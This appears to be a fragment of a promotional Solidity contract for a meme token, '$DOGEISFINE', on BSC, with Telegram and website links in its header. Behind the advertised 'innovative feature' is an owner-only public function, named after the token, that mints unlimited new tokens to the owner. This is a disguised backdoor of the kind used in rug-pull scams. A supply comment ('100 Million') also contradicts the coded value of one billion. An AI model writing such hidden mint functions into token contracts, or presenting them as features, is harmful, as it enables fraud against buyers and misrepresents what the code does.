//
// $DOGEISFINE proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/DogeisFineBSC
// 📱 Website ::https://dogeisfine.io
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _DOGEISFINE(uint256 amount) public onlyOwner {
 _DOGEISFINE(msg.sender, amount);
    }
    ...
    function _DOGEISFINE(address account, uint256 amount) internal virtual {
...
contract $DOGEISFINE is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("DOGE IS FINE", "D O G E") {
     _DOGEISFINE(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}